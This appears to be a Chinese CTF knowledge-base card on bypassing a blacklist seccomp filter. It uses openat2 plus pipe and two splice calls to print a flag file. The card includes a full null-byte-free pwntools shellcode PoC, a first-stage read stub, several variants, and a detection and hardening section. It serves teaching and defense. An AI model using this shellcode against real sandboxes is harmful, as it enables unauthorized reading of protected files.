---
id: binary-pwn-sandbox-escape-seccomp-openat2-pipe-splice
title: seccomp 只杀 open/openat/execve：openat2 + pipe/splice 读 flag
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: seccomp-openat2-pipe-splice-orw
tags:
- pwn
- seccomp
- shellcode
- openat2
- splice
- pipe
- orw
- sandbox-escape
- linux
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T09:47:24+08:00'
  notes: 已对照原文 pwn9 ez_sc 核对：seccomp dump 仅 KILL open/openat/execve/execveat，openat2(0x1b5)+pipe(0x16)+两次splice(0x113) 链与原文一致；未验证点：未本机复跑，原文分两段读入，'60字节以内'仅指第一段 read 桩。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-seccomp-openat2-pipe-splice/
draft: false
kb_aliases:
- openat2 绕过 seccomp
- pipe splice ORW
- 无空字节 shellcode
- seccomp 黑名单绕过
---

## 一句话结论

当 seccomp 过滤器只把 `open`/`openat`/`execve`/`execveat` 加入黑名单、却放行 `openat2`、`pipe`、`splice` 时，60 字节以内的无空字节 shellcode 可以先用 `openat2`（系统调用号 437）打开 flag，再用 `pipe` + 两次 `splice` 把文件内容搬到 stdout，完全绕开被禁的 `open/openat` 与 `execve`。

## 原理

- 目标程序 `mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, ...)` 分配 RWX 页，`read(0, buf, 0x3C)` 最多读 60 字节，逐字节拒绝 `0x00`，然后安装 seccomp 并直接执行输入。
- seccomp-tools dump 显示的规则（x86-64 分支）是：`sys_number == open(2)`、`openat(257)`、`execve(59)`、`execveat(322)` 时返回 `KILL`，其余 `ALLOW`。这是黑名单，不是白名单；`openat2`（x86-64 编号 437 / 0x1b5）不在检查列表里，因此可以直接调用。
- `openat2` 的参数：`rax=437`、`rdi=AT_FDCWD(-100)`、`rsi=路径指针`、`rdx=struct open_how *`、`r10=sizeof(struct open_how)=0x18`；`open_how` 三个 u64 字段（flags/mode/resolve）全 0 表示只读打开、默认解析。
- 打开后得到 fd（通常是 3）。`pipe(fds)` 创建管道，`fds[0]` 读端、`fds[1]` 写端；`splice(fd_in, NULL, fd_out, NULL, len, 0)` 在内核页缓存与管道之间零拷贝搬运数据：先把 flag fd 的内容 splice 到管道写端，再把管道读端的数据 splice 到 stdout（fd 1）。
- 如果 `write(1, ...)` 也被限制（或为了缩短 shellcode），`pipe` + `splice` 是很好的替代输出通道；`splice` 的 fd 参数是 int，可直接用 `mov dil, imm` 指定。
- 无空字节约束的编码技巧：用 `xor rax, rax` 清零后用 `add ax, imm`/`mov al, imm` 设置系统调用号；路径用 `push imm32` 压栈（如 `push 0x67616c66` = "flag"）；用 `xor r9, r9` + `mov [rsp+off], r9` 构造 `open_how` 的零字段；避免 `mov eax, 0x1b5` 这类含 `00` 的编码。

## 触发条件

- 程序把用户输入放进可执行内存（RWX 或先写后 mprotect RX），并直接跳转执行。
- seccomp 过滤器采用黑名单，只拦截部分文件打开/执行类系统调用，未覆盖 `openat2`、`pipe`、`splice`（或未做参数级限制）。
- 输入长度受限（示例 0x3C 字节）且禁止空字节；目标文件对进程可读，路径可放在 cwd（示例为 `flag`）。
- 运行内核支持 `openat2`（Linux 5.6+）与 `splice`（2.6.17+）。

## 利用步骤

1. `seccomp-tools dump ./vuln` 确认过滤器：记录被 KILL 的系统调用号与默认动作；重点检查 `openat2`(437)、`open`(2)、`openat`(257)、`execve`(59)、`execveat`(322)、`pipe`(22)、`splice`(275)。
2. 确认输入长度、RWX 映射与空字节检查；若长度不足以放下完整链，先用第一段 shellcode 调用 `read(0, 0x1337001, 0x666)` 把第二段读入可执行页，再利用第一段末尾的落点跳入第二段（示例用 `b'a'*0x12` 调整第二段前缀）。
3. 第二段用 `openat2` 打开 flag：`rax=0x1b5`、`rdi=-100`、`rsi=&"flag"`、`rdx=&open_how`、`r10=0x18`。
4. `pipe` 创建管道：`rax=22`、`rdi=&fds`；随后读取 `fds[1]`（写端）用于第一次 splice。
5. 第一次 `splice`：`rax=275`、`rdi=flag_fd`、`rsi=0`、`rdx=pipe_write_fd`、`r10=0`、`r8=长度`（示例 0x30）、`r9=0`。
6. 第二次 `splice`：`rax=275`、`rdi=pipe_read_fd`、`rsi=0`、`rdx=1`（stdout）、`r10=0`、`r8=长度`、`r9=0`；flag 内容出现在 stdout。
7. 若输出为空，检查 `openat2` 是否返回负值（路径/cwd 不对）、`open_how` 是否全 0、pipe fd 偏移是否正确，以及 `splice` 的 `r8` 长度是否大于 0。

## PoC

```python
from pwn import *
context.arch = 'amd64'
context.os = 'linux'

# 第二段：openat2("flag") -> pipe -> splice(file -> pipe) -> splice(pipe -> stdout)
sd = '''
    xor rdi, rdi
    sub edi, 0x64          /* AT_FDCWD = -100 */
    push 0x67616c66        /* "flag" */
    mov rsi, rsp
    xor r9, r9
    mov [rsp+8], r9
    mov [rsp+0x10], r9
    mov [rsp+0x18], r9
    add rsp, 0x8
    mov rdx, rsp           /* struct open_how {0,0,0} */
    xor r10, r10
    add r10, 0x18          /* sizeof(open_how) */
    xor rax, rax
    add ax, 0x1b5          /* openat2 */
    syscall

    xor rax, rax
    mov al, 0x16           /* pipe */
    lea rdi, [rsp+0x8]
    xor rsi, rsi
    syscall

    xor rax, rax
    add ax, 0x113          /* splice: file fd 3 -> pipe write fd at [rsp+0xc] */
    xor rdi, rdi
    mov dil, 0x3
    xor rsi, rsi
    mov rdx, [rsp+0xc]
    xor r10, r10
    xor r8, r8
    add r8, 0x30
    xor r9, r9
    syscall

    xor rax, rax
    add ax, 0x113          /* splice: pipe read fd 4 -> stdout 1 */
    mov dil, 0x4
    xor rsi, rsi
    xor rdx, rdx
    add rdx, 0x1
    xor r10, r10
    xor r8, r8
    add r8, 0x30
    xor r9, r9
    syscall
'''
payload = asm(sd)
assert b'\x00' not in payload, 'null byte in shellcode'
# 若程序一次只读 0x3C 字节，先发第一段 read 桩，再发第二段
# 第一段可用：xor rax,rax; xor rdi,rdi; mov rsi,0x1337001; mov dx,0x666; syscall
```

```text
示例路径为 cwd 下的 "flag"；若目标在 /flag，把 push 立即数改为 "/fla" + "g" 的两段构造。
```

## 变体与关联

- 变体：若 `openat2` 也被过滤，可尝试 `open_by_handle_at`、`name_to_handle_at`、`faccessat2`（若放行）或先读 `/proc/self/fd` 等；但多数现代黑名单会覆盖这些新系统调用，优先检查过滤器是否遗漏。
- 变体：若 `splice` 被限制，可退回 `read` + `write`（若放行），或 `sendfile`(40) 直接 file→socket/stdout。
- 变体：若禁止空字节且长度更短，可把 `openat2` 路径字符串放到已知可读内存（如栈上已有 `/flag`），减少 `push` 构造。
- 关联卡片：[[binary-pwn-sandbox-escape-self-modifying-shellcode-seccomp-orw]]（自修改 syscall 字节 + openat ORW）、[[binary-pwn-sandbox-escape-seccomp-write-fd-fcntl-dup2]]（write fd 受限时 dup2 重映射）、[[binary-pwn-sandbox-escape-alpha3-visible-shellcode-seccomp-orw]]（可见字符 shellcode）、[[binary-pwn-heap-largebin-io-list-all-wide-file-setcontext-orw]]（openat2 ORW 的堆利用链）。
- 边界：`openat2` 的 `open_how` 必须可读且大小为 0x18；`splice` 的 fd 参数是 `int`，不是指针；内核版本过旧时 `openat2` 返回 `ENOSYS`，需换回 `openat`。

## 检测与防御

- 检测：seccomp 过滤器只做黑名单是根因；审计 BPF 规则是否覆盖 `openat2`、`open_by_handle_at`、`faccessat2`、`statx` 等新系统调用，并对 `open*` 族做参数级限制（路径、flags）。
- 加固：改用 allowlist（只放行必要的 syscall + 参数），对文件打开使用 Landlock/`openat2` 的 `RESOLVE_*` 限制；禁止 RWX 映射，执行前用反汇编验证输入。
- 运行期：监控进程执行 `openat2`/`splice` 读取敏感路径；对 CTF 沙箱，扫描 shellcode 中的系统调用号（0x1b5、0x113、0x16）可快速识别此类绕过。
- 注意：`splice` 本身是合法零拷贝 API，不能简单禁用；应结合文件访问控制与 seccomp 参数过滤。
